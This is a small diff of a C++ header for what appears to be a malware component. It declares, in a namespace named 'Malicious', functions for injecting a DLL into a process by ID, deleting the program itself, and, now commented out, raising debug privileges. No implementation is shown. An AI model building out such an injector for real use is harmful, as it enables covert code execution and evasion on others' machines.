@@ -1,19 +1,18 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
-#ifndef _INJECTOR_HPP_
-#define _INJECTOR_HPP_
+#ifndef _INJECTOR_
+#define _INJECTOR_
 
 #include <system/Process.hpp>
+#include <common/Exception.hpp>
 #include <string>
 
 namespace Malicious
 {
+	typedef Common::Exception InjectionError;
+
 	void DeleteMyself(const char * tempfilename, const char * cmd);
 	bool inject(DWORD pid, std::string dll);
-    bool SetDebugPrivileges();
+    //void SetDebugPrivileges();
 
 } // Malicious
 
-#endif // _INJECTOR_HPP_
+#endif // _INJECTOR_
